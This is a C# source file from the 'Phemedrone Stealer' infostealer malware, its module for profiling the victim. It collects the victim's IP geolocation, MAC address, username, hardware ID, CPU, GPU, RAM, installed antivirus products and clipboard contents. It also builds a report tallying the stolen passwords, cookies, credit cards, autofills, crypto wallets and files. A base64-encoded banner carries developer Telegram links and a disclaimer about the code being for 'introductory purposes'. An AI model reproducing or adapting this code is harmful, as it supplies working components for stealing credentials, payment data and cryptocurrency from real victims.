using System;
using System.Collections.Generic;
using System.Text;
using Phemedrone.Classes;
using System.Net;
using System.Reflection;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Management;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Information : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Low;
        protected override string GetServiceName() => "Information";
        
        public static string JsonString = GetGeoInformation();
        

        protected override LogRecord[] Collect()
        {
            const int padding = -25;
            var totalRam = GetTotalRam();
            var jsonParser = new JsonParser();
            var report = $@"
    ,d88b.d88b,    
    88888888888    Phemedrone Stealer
    `Y8888888Y'    {DateTime.Now:dd/MM/yyyy HH:mm:ss}
      `Y888Y'      Developed by https://t.me/webster480 & https://t.me/TheDyer
        `Y'        Tag: {Config.Tag}

    ----- Geolocation Data -----

{"IP:",padding}{jsonParser.ParseStringV2("ip", JsonString)}
{"Country:",padding}{jsonParser.ParseStringV2("country", JsonString)} ({jsonParser.ParseStringV2("country_code", JsonString)})
{"City:",padding}{jsonParser.ParseStringV2("city", JsonString)}
{"Postal:",padding}{jsonParser.ParseStringV2("asn", JsonString)}
{"MAC:",padding}{GetMac()}

    ----- Hardware Info -----

{"Username:",padding}{Environment.UserName}\{Environment.MachineName} 
{"Windows name:",padding}{GetWindowsVersion()} {(Environment.Is64BitOperatingSystem ? "x64" : "x32")}
{"Hardware ID:",padding}{GetHwid()}
{"Screen Resolution:",padding}{GetScreenResolution()}
{"GPU:",padding}{string.Join($"\r\n{"",padding}", GetGPUs())}
{"CPU:",padding}{GetCPU()}
{"RAM:",padding}{Math.Round(totalRam, 0)} GB

    ----- Report Contents -----

{"Passwords:",padding}{ServiceCounter.PasswordList.Count}
{"Cookies:",padding}{ServiceCounter.CookieCount}
{"Credit Cards:",padding}{ServiceCounter.CreditCardCount}
{"AutoFills:",padding}{ServiceCounter.AutoFillCount}
{"Extensions:",padding}{ServiceCounter.ExtensionsCount}
{"Wallets:",padding}{ServiceCounter.WalletsCount}
{"Files:",padding}{ServiceCounter.FilesCount}

{(ServiceCounter.PasswordsTags.Count == 0 ? string.Empty : $"{"Passwords Tags:",padding}{string.Join(", ", ServiceCounter.PasswordsTags.Distinct())}")}
{(ServiceCounter.CookiesTags.Count == 0 ? string.Empty : $"{"Cookies Tags:",padding}{string.Join(", ", ServiceCounter.CookiesTags.Distinct())}")}

    ----- Miscellaneous -----

{"Antivirus products:",padding}{string.Join(", ", GetAv())}
{"File Location:",padding}{Assembly.GetEntryAssembly()?.Location ?? "unknown"}
{"Clipboard text:",padding}{GetClipboardText()}";
            //File.WriteAllText("report.txt", report);
            
            return new[]
            {
                new LogRecord
                {
                    Path = "Information.txt",
                    Content = Encoding.UTF8.GetBytes(report)
                }
            };
            
        }

        public static string GetComment()
        {
            // кто поменяет тот пастер скидер личер 
            return "CiAgICAsZDg4Yi5kODhiLCAgICAKICAgIDg4ODg4ODg4ODg4ICAgIFBoZW1lZHJvbmUgU3RlYWxlcgogICAgYFk4ODg4ODg4WScgICAgRGV2ZWxvcGVkIGJ5IGh0dHBzOi8vdC5tZS93ZWJzdGVyNDgwICYgaHR0cHM6Ly90Lm1lL1RoZUR5ZXIKICAgICAgYFk4ODhZJyAgICAgIAogICAgICAgIGBZJyAgICAgICAgCiAgICAgICAgIAo9PT09PT09PT09PT09PT09PT09PT09TElOS1M9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkNoYW5uZWw6IGh0dHBzOi8vdC5tZS9mcmVha2NvZGluZ3Nwb3QKQ2hhdDogaHR0cHM6Ly90Lm1lLytUUXRQLXIwQjZYWTBPREk2Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIVdBUk5JTkchIEFMTCBDT0RFIElTIEZPUiBJTlRST0RVQ1RPUlkgUFVSUE9TRVMKV0UgQVJFIE5PVCBSRVNQT05TSUJMRSBGT1IgWU9VUiBBQ1RJT05TICFXQVJOSU5HIQ==";
        }

        public static string GetSummary()
        {
            var jsonParser = new JsonParser();
            var ip = jsonParser.ParseStringV2("ip", JsonString);
            var country = jsonParser.ParseStringV2("country", JsonString);
            
                return $@"

``` - IP: {(ip.Length < 1 ? "Unknown" : ip.Replace(".", @"\."))} \({(country.Length < 1 ? "Unknown" : country)}\)
 - Tag: {Config.Tag} {(Config.BuildID.Length > 0 ? $"({Config.BuildID})" : "")}
 - Passwords: {ServiceCounter.PasswordList.Count}
 - Cookies: {ServiceCounter.CookieCount}
 - Wallets: {ServiceCounter.WalletsCount}
```
{(ServiceCounter.PasswordsTags.Count == 0 ? string.Empty : $"Passwords Tags: {string.Join(", ", ServiceCounter.PasswordsTags.Distinct())}")}
{(ServiceCounter.CookiesTags.Count == 0 ? string.Empty : $"Cookies Tags: {string.Join(", ", ServiceCounter.CookiesTags.Distinct())}")}

               ";
            
        }

        public static string[] InfoArray()
        {
            var jsonParser = new JsonParser();
            var ip = jsonParser.ParseStringV2("ip", JsonString);
            var country = jsonParser.ParseStringV2("country", JsonString);
            var countryCode = jsonParser.ParseStringV2("country_code", JsonString);
            return new[]
            {
                country.Length < 1 ? "Unknown" : country,
                countryCode.Length < 1 ? "Unknown" : countryCode,
                ip.Length < 1 ? "Unknown" : ip,
                Environment.UserName,
                GetHwid(),
                GetFileName(),
                ServiceCounter.PasswordList.Count.ToString(),
                ServiceCounter.CookieCount.ToString(),
                ServiceCounter.WalletsCount.ToString(),
                string.Join(", ", ServiceCounter.PasswordsTags.Distinct()),
                string.Join(", ", ServiceCounter.CookiesTags.Distinct()),
                Config.Tag
            };
        }

        public static string GetFileName()
        {
            try
            {
                var jsonParser = new JsonParser();
                var ip = jsonParser.ParseStringV2("ip", JsonString);
                var country = jsonParser.ParseStringV2("country_code", JsonString);
                return
                    $"[{(country.Length < 1 ? "Unknown" : country)}]{(ip.Length < 1 ? "Unknown" : ip)}.zip";
            }
            catch
            {
                return "[UNKNOWN]0.0.0.0.zip";
            }
        }

        private static string GetScreenResolution()
        {
            try
            {
                var w = Screen.PrimaryScreen.Bounds.Width.ToString();
                var h = Screen.PrimaryScreen.Bounds.Height.ToString();
                return $"{w}x{h}";
            }
            catch
            {
                // ignore
                return "Unknown";
            }
        }

        private static string GetGeoInformation()
        {
            try
            {
                using (var client = new WebClient())
                {
                    return client.DownloadString("https://get.geojs.io/v1/ip/geo.json");
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetWindowsVersion()
        {
            var ver = NullableValue.Call(() =>
                Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName",
                    ""));
            return ver?.ToString() ?? "Unknown";
        }

        private static IEnumerable<string> GetAv()
        {
            var result = new List<string>();
            try
            {
                var searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
                var antivirusList = searcher.Get();
                foreach (var obj in antivirusList)
                {
                    var productName = obj["displayName"].ToString();
                    result.Add(productName);
                }
            }
            catch
            {
                // ignored
            }

            return result;
            }

        private static string GetMac()
        {
            try
            {
                foreach (var networkInterfaces in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (networkInterfaces.OperationalStatus != OperationalStatus.Up) continue;

                    var physAddress = networkInterfaces.GetPhysicalAddress();
                    var addressBytes = physAddress.GetAddressBytes();
                    var macString = string.Empty;
                    for (var i = 0; i < addressBytes.Length; i++)
                    {
                        macString += addressBytes[i].ToString("X2");
                        if (i != addressBytes.Length - 1)
                        {
                            macString += ":";
                        }
                    }

                    return macString;
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        /*private static double GetUsedRam()
        {
            try
            {
                var usedCounter = new PerformanceCounter("Memory", "Available Bytes");
                var usedBytes = (long)usedCounter.NextValue();
                return Math.Floor(usedBytes / 1024d / 1024d / 1024d);
            }
            catch
            {
                return 0;
            }
        }*/

        public static IEnumerable<string> GetGPUs()
        {
            var result = new List<string>();
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
                foreach (var obj in searcher.Get())
                {
                    result.Add(obj["Name"]?.ToString()
                               ?? "Unknown");
                }

                if (result.Count < 1)
                {
                    result.Add("Unknown");
                }
            }
            catch
            {
                // ignored
            }

            return result;
        }

        private static string GetCPU()
        {
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                foreach (var obj in searcher.Get())
                {
                    return obj["Name"]?.ToString()
                           ?? "Unknown";
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }
        
        private static double GetTotalRam()
        {
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (var obj in searcher.Get())
                {
                    return Convert.ToDouble(obj["TotalPhysicalMemory"]?.ToString() ?? "0")
                           / 1024d / 1024d / 1024d;
                }
            }
            catch
            {
                // ignored
            }

            return 0;
        }

        private static string GetHwid()
        {
            try
            {
                var builder = new StringBuilder();
                var keyValues = new Dictionary<string, string>
                {
                    { "Win32_Processor", "ProcessorId" },
                    { "Win32_DiskDrive", "SerialNumber" }
                };
                
                foreach (var keyValue in keyValues)
                {
                    var searcher = new ManagementObjectSearcher("SELECT * FROM " + keyValue.Key);
                    foreach (var obj in searcher.Get())
                    {
                        builder.Append(obj[keyValue.Value]);
                    }
                }

                using (var md5 = MD5.Create())
                {
                    var hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(builder.ToString()));
                    var md5Builder = new StringBuilder();
                    
                    foreach (var b in hashBytes)
                    {
                        md5Builder.Append(b.ToString("X2"));
                    }
                    
                    return md5Builder.ToString().ToLower();
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }
        
        [DllImport("user32.dll")]
        static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("user32.dll")]
        static extern bool IsClipboardFormatAvailable(uint format);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseClipboard();
        [DllImport("kernel32.dll")]
        static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")]
        static extern bool GlobalUnlock(IntPtr hMem);

        private const uint UnicodeIndex = 13;

        private static string GetClipboardText()
        {
            try
            {
                if (!IsClipboardFormatAvailable(UnicodeIndex))
                    return null;
                if (!OpenClipboard(IntPtr.Zero))
                    return null;

                string data = null;
                var hGlobal = GetClipboardData(UnicodeIndex);
                if (hGlobal != IntPtr.Zero)
                {
                    var lpwcstr = GlobalLock(hGlobal);
                    if (lpwcstr != IntPtr.Zero)
                    {
                        data = Marshal.PtrToStringUni(lpwcstr);
                        GlobalUnlock(lpwcstr);
                    }
                }

                CloseClipboard();

                return data;
            }
            catch
            {
                return "UNKNOWN";
            }
        }
    }
}